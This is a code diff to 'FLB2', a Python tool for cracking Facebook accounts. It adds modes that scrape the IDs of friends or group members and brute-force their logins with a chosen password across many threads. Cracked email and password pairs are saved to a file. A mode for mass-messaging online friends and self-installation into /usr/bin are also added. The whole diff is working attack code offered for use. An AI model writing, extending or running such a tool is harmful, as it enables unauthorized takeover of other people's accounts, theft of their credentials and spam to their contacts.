@@ -7,8 +7,11 @@ import marshal
 import re
 import sys
 import os
+from distutils.spawn import find_executable
 from multiprocessing import cpu_count , Process
 from multiprocessing.pool import ThreadPool 
+  
+
 os.system("clear")
 
 W = '\x1b[1;37m'
@@ -48,10 +51,11 @@ banner = f'''{Y}
  / __ \ \__/ / __ \   {W}UPDATED VERSION {R}(FIX){Y}
 / /  \ \____/ /  \ \   {W}    BY {Y}
 \ \__/ / __ \ \__/ /   {W} NASIR ALI{Y}
- \____/ /  \ \____/      {G}V {Y}1.1
+ \____/ /  \ \____/      {G}V {Y}1.2
  
 {Y} Github : {G}https://{W}github.com/nasirxo/flb2
 {Y} Facebook : {G}https://{W}fb.com/nasir.xo
+{Y} Support Via PayPal : {G}https://{W}paypal.me/nprocoder
 
    {W}[{G}!{W}] OPERATING SYSTEM : {G}{OS_NAME}
    {W}[{G}!{W}] CPU CORES : {G}{CPU_CORES}
@@ -69,6 +73,25 @@ except:
     os.system('pip3 install requests bs4')
     from requests import *
     from bs4 import BeautifulSoup as bs 
+
+
+if find_executable("flb2") == None:
+    print(G + bxall + " INSTALLING FLB2 AS SHELL COMMAND ... ")
+    L_TYPE = os.popen('echo $HOME').read()
+    if "com.termux" in L_TYPE:
+         print(f" {W}[{R}!{W}] {G}TERMUX DETECTED !")
+         if os.path.exists("flb2.py"):
+             os.system("cp flb2.py $HOME/../usr/bin/flb2")
+             os.system("chmod +x $HOME/../usr/bin/flb2")
+             print(f" {W}[{G}!{W}] {G} FLB2 INSTALLED SUCESSFULLY !")
+    else:
+         print(f" {W}[{R}!{W}] {G}REGULAR LINUX DETECTED !")
+         if os.path.exists("flb2.py"):
+             os.system("cp flb2.py /usr/bin/flb2")
+             os.system("chmod +x /usr/bin/flb2")
+             print(f" {W}[{G}!{W}] {G} FLB2 INSTALLED SUCESSFULLY !")             
+    print(f" {W}[{Y}!{W}] YOU CAN NOW RUN FLB2 BY {G}$FLB2")
+
 
 
 
@@ -1550,13 +1573,137 @@ class FB:
      try: data['emails']=re.findall('\S+@\S+',text)
      except: pass
      return data    
+
+
+   def fbsend(self,message,account_id):
+       if not account_id.isdigit():
+        try:
+         account_id=asearch(bs(self.s.get(self.url.format("/"+str(account_id))).content,'html.parser').findAll('a'),'photo.php').split('&id=')[1].split('&set')[0]
+        except: pass
+       k = self.url.format('/messages/thread/'+str(account_id))
+       data=[]
+       urlm=bs(self.s.get(k).content,"html.parser")
+       for x in urlm("form"):
+          if "/messages/send/" in x["action"]:
+             data.append(self.url.format(x["action"]))
+             break
+      
+       for x in urlm("input"):
+         try:
+           if "fb_dtsg" in x["name"]:
+                        data.append(x["value"])
+           if "jazoest" in x["name"]:
+                        data.append(x["value"])
+           if "ids" in x["name"]:
+             data.append(x["name"])
+             data.append(x["value"])
+           if len(data) == 7: break
+         except: pass
+      
+       if len(data) == 7:
+        f=self.s.post(data[0],data={
+                      "fb_dtsg":data[1],
+                      "jazoest":data[2],
+                      data[3]:data[4],
+                      data[5]:data[6],
+                      "body":message,
+                      "Send":"Kirim"}).url
+        if "send_success" in f:
+          return {
+                  'status':'message_sent',
+                  'account_id':account_id,
+                  'message_length':len(message)
+          }
+        else:
+          return {
+              'status':'message_failed',
+              'account_id':account_id,
+              'message_length':len(message)
+          }    
+
+
+
+
+
+   def addfriend(self,ID):
+     if ID.isdigit():
+       r = self.s.get(self.url.format("/profile.php?id="+ID))
+     else:
+       r = self.s.get(self.url.format("/"+ID))
+
+     html = bs(r.content,"html.parser")
+     L = asearch(html.findAll('a'),'profile_add_friend.php')
+     return self.s.get(self.url.format(L)) 
+
+   def getmygroups(self):
+    r = self.s.get(self.url.format("/groups/?seemore"))
+    html = bs(r.content,"html.parser")
+    G = html.findAll('li')
+    data = {};i=0
+    for x in G:
+      data[i]={
+               'name':x.a.get_text(),
+               'id':re.findall(r'\d+',x.a.get('href'))[0]
+              };i+=1
+    return data
    
    def getname(self):
      r = self.s.get(self.url.format('/profile.php'))
      html = bs(r.content,'html.parser')
      return html.title.get_text()
 
+   def getgroupadmins(self,n):
+    i=0;data={}
+    link = self.url.format("/browse/group/members/?id="+str(n)+"&listType=list_admin_moderator")
+    while True:
+      con = self.s.get(link)
+      html = bs(con.content,"html.parser")
+      u = html.find_all('table')
+      CZ = [' '.join(u[C]['class']) for C in range(len(u))]
+      cls = max(set(CZ),key=CZ.count)
+      tb = html.find_all('table',attrs={'class':cls})
+  
+      for U in tb:
+        try:
+          data[i]={
+             'name':U.a.get_text(),
+             'id':U['id'].split('_')[1]
+          };i+=1
+        except:
+          pass
+  
+      try:
+        nlink = html.find("div",attrs={"id":"m_more_item"})
+        link = self.url.format(nlink.a['href'])
+      except:
+        break
+    return data
 
+   def getgroup(self,n):
+    i=0;data={}
+    link = self.url.format(f"/browse/group/members/?id={n}&listType=list_nonfriend_nonadmin")
+    while True:
+      con = self.s.get(link)
+      html = bs(con.content,"html.parser")
+      u = html.find_all('table')
+      cls = ' '.join(u[5]['class'])
+      tb = html.find_all('table',attrs={'class':cls})
+  
+      for U in tb:
+        try:
+          data[i]={
+             'name':U.a.get_text(),
+             'id':U['id'].split('_')[1]
+          };i+=1
+        except:
+          pass
+  
+      try:
+        nlink = html.find("div",attrs={"id":"m_more_item"})
+        link = self.url.format(nlink.a['href'])
+      except:
+        break
+    return data
 
 
 class CRACK_COUNTER:
@@ -1601,12 +1748,16 @@ def crack(email_pass):
       print(f" {G}[+]{W} {email} {G}|{W} {password} ")
       C_C.sucess()
       Q.savecookie(f"{email}.cookie")
+      with open("cracked_accounts.txt",'a') as C_A:
+          C_A.write(f"[L] {email} | {password}\n")
       
    if "checkpoint" in Q_RES.url:
       C_C.checkpoint()
       RES_ATTR = Q_RES.url.replace(Q.url.format("/"),"")
       print(f" {G}[+]{W} {email} {G}|{W} {password} -> {Y}{RES_ATTR}")
-      
+      with open("cracked_accounts.txt",'a') as C_A:
+          C_A.write(f"[C] {email} | {password}\n")   
+             
    if len(Q.getaccountid()) < 2 and "checkpoint" not in Q_RES.url:
       C_C.fail()
       print(C_C.F,end="\r")
@@ -1638,11 +1789,12 @@ if __name__ == '__main__':
        {W}=== (LOGIN OPTIONS) ===
         {G}[1] LOGIN VIA EMAIL/PASS
         {G}[2] LOGIN VIA COOKIE (RECOMENDED)
+        {G}[3] LOGIN VIA FLB ACESS KEY
        {W}========================
      """)
      while True:
        INP = input(f"{W} [-] OPTION : {Y}")
-       if INP in list("12"):
+       if INP in list("123"):
          if INP == '1':
            email = input(f" {G}[+]{W} ENTER EMAIL : ")
            password = input(f" {G}[+]{W} ENTER PASS : ")
@@ -1662,6 +1814,13 @@ if __name__ == '__main__':
            f.cookieinput()
            f.savecookie("cookie")
            break
+           
+         if INP == '3':
+           print(f"{G} [!] {Y}INFO : {W} ONLY FLB ACESS KEY IS ACCEPTED")
+           f.setkey(input(f" {G}[+]{W} ACESS KEY :{Y} "))
+           f.savecookie("cookie")
+           break
+           
        else:
          print(f" {R}[!]{W} Invalid Option Selected ")  
      
@@ -1702,16 +1861,50 @@ if __name__ == '__main__':
      print(f" {W}[{R}+{W}]{W} Invalid Cookie ! ") 
      exit()
      
-   print(f" {G}[+]{W} Logged In as : {a_name} ")  
-   if os.path.exists(f"{a_id}.ids") == True: 
+   print(f" {G}[+]{W} Logged In as : {a_name} ")     
+   
+   MENUE_MODE = 0
+   print(f"""
+       {W}========= ( MENUE ) =========
+        {G}[1] FRIENDLIST BRUTE FORCE
+        {G}[2] GROUP MEMBERS BRUTEFORCE
+        {G}[3] SEND MESSAGE TO ONLINE FRIENDS
+        {G}[4] GENERATE FLB2 ACESS KEY
+       {W}=============================
+     """)   
+   while True:
+       INP = input(f"{W} [-] OPTION : {Y}")
+       if INP in list("1234"):
+         if INP == '1': 
+            MENUE_MODE = 1
+            print(f" {W}[{G}!{W}] {G}ACTIVATED FRIENDLIST BRUTEFORCE MODE")  
+            break
+         if INP == '2': 
+            MENUE_MODE = 2
+            print(f" {W}[{G}!{W}] {G}ACTIVATED GROUP BRUTEFORCE MODE")  
+            break
+         if INP == '3':
+            MENUE_MODE = 3
+            print(f" {W}[{G}!{W}] {G}ACTIVATED MESSAGE SEND MODE")  
+            break
+         if INP == '4': 
+            FLB2_A_KEY = str(f.getkey().decode("utf-8"))
+            print(f" {G}[+]{W} ACESS KEY :{Y}",FLB2_A_KEY)    
+       else:
+         print(f" {R}[!]{W} Invalid Option Selected ")       
+
+   if os.path.exists(f"{a_id}.ids") == True and MENUE_MODE == 1: 
        f.load_friend_ids(f"{a_id}.ids")
-       if len(f.friends_ids.keys()) == 0:
+       RELOAD_FRIENDLIST = input(f"{W} [{Y}!{W}] RELOAD FRIENDLIST ? {W}({G}Y{W}/{R}N{W}) : {Y}").upper()
+       if len(f.friends_ids.keys()) == 0 or RELOAD_FRIENDLIST == "Y":
           f.getfriends()
           f.save_friend_ids(f"{a_id}.ids")      
-   if os.path.exists(f"{a_id}.ids") == False: 
+             
+   if os.path.exists(f"{a_id}.ids") == False and MENUE_MODE == 1: 
        f.getfriends()
        f.save_friend_ids(f"{a_id}.ids")
-   while True:
+       
+   while MENUE_MODE == 1:
      C_C.S = 0
      C_C.F = 0
      C_C.C = 0
@@ -1732,7 +1925,71 @@ if __name__ == '__main__':
      print(f"\n\n{W} ===========({G}CRACKING{W})=============")
      TP.map(crack,CRACK_LIST)
      print(f"\n\n{W} ===========({G}FINISHED{W})=============\n\n")
-     #f.getfriends()
-     #f.save_friend_ids("friends.ids")
    
-   
+   if MENUE_MODE == 2: 
+     while True:
+        try: 
+          MY_GROUPS  = f.getmygroups()
+          if len(MY_GROUPS.keys()) > 0: break
+        except: pass
+        
+   while MENUE_MODE == 2:
+    print(f"\n{W}  ======= ( {Y}SELECT GROUP{W} ) ========")
+    for X in list(MY_GROUPS.keys()):
+         try:
+          GROUP_NAME = MY_GROUPS[X]['name']
+          print(f"{W} ({G}{X}{W}){Y} {GROUP_NAME}")
+         except: pass
+        
+    print("\n") 
+    GROUP_SELECT = int(input(f"{W} [{G}*{W}] ENTER OPTION : {Y}"))
+    if GROUP_SELECT not in MY_GROUPS.keys():
+        print(f" {R}[!]{W} Invalid Option Selected ") 
+    else:   
+     GROUP_ID = MY_GROUPS[GROUP_SELECT]['id']
+     print(f"{W} [{G}*{W}] {G}Getting Group IDs ...")
+     while True:
+        try:
+          GROUP_IDS = f.getgroup(GROUP_ID)
+          if len(GROUP_IDS.keys()) > 0: break
+        except: pass
+
+     print(f"{W} [{G}+{W}] {G}Loaded {len(GROUP_IDS.keys())} Group IDs ...")
+     C_C.S = 0
+     C_C.F = 0
+     C_C.C = 0
+     C_C.T = len(GROUP_IDS.keys())
+     TRY_PASS =  input(f"{W} [-] PASSWORD TO TRY : {Y}")
+     CRACK_LIST = []
+     print(f"{G} [+] MAKING IDS/PASSWORD COMBINATION ...")
+     for W_L in GROUP_IDS.keys():
+       #time.sleep(0.001)
+       try:
+         crack_text = f"{GROUP_IDS[W_L]['id']}::{TRY_PASS}"
+         print(f"{Y} [*] Adding - {W}({GROUP_IDS[W_L]['id']})",end="\r")
+         CRACK_LIST.append(crack_text)
+       except: pass
+     
+     print(f"{G} [+] CRACKING IN MULTITHREAD MODE ...")
+     print(f"{G} [!] {Y}INFO : {W}if any account is cracked it will be shown below so be patient")
+     print(f"\n\n{W} ===========({G}CRACKING{W})=============")
+     TP.map(crack,CRACK_LIST)
+     print(f"\n\n{W} ===========({G}FINISHED{W})=============\n\n")
+     
+   while MENUE_MODE == 3:
+    print(f"{W} [{Y}!{W}] Getting Online Friends ...")
+    while True:
+      try:
+        ONLINE_FRIENDS = f.getonline()
+        if len(ONLINE_FRIENDS) > 0: break
+      except: pass
+      
+    print(f"{W} [{Y}!{W}] Online Friends : {G}{len(ONLINE_FRIENDS)}")
+    MESSAGE = input(f" {W}[{G}!{W}] MESSAGE :{Y}")
+    print(f"{W} [{G}+{W}] Sending Messages .... !")
+    for X in ONLINE_FRIENDS:
+         try:
+          M_RES = f.fbsend(MESSAGE,X)
+          print(f"{W} [{G}!{W}] SENDING TO ({G}{X}{W})",end="\r")
+         except: pass
+    print(f"{W} [{G}!{W}] MESSAGE SENDING FINISHED .. !\n")
